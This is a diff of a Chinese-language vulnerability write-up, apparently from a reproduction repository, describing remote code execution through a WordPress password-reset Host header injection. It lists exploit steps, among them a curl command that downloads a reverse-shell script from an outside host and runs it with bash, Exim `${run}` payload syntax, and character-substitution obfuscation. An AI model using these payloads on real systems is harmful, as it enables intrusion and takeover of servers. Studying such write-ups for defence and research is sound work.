@@ -44,13 +44,13 @@ wp-submit=Get+New+Password&redirect_to=&user_login=admin
 
 所以，总体来说利用过程如下：
 
-1. 编写反弹shell的exp，放到某个网页里。有如下要求：
+- 编写反弹shell的exp，放到某个网页里。有如下要求：
   - 整个url的大写字母会被转换成小写，所以大写小敏感的系统不要使用大写字母做文件路径
   - 访问该网页不能跳转，因为follow跳转的参数是`-L`（大写）
-2. 拼接成命令`/usr/bin/curl -o/tmp/rce example.com/shell.sh`和命令`/bin/bash /tmp/rce`
-3. 将上述命令中的空格和`/`转换成`${substr{10}{1}{$tod_log}}`和`${substr{0}{1}{$spool_directory}}`
-4. 拼接成HTTP包的Host头：`target(any -froot@localhost -be ${run{command}} null)`
-5. 依次发送这两个拼接好的数据包
+- 拼接成命令`/usr/bin/curl -o/tmp/rce example.com/shell.sh`和命令`/bin/bash /tmp/rce`
+- 将上述命令中的空格和`/`转换成`${substr{10}{1}{$tod_log}}`和`${substr{0}{1}{$spool_directory}}`
+- 拼接成HTTP包的Host头：`target(any -froot@localhost -be ${run{command}} null)`
+- 依次发送这两个拼接好的数据包
 
 我将上述过程写成[exp脚本](exploit.py)，将脚本中target修改成你的目标，user修改成一个已经存在的用户，`shell_url`修改成你放置payload的网址。（或直接将target作为第一个参数、`shell_url`作为第二个参数）
 
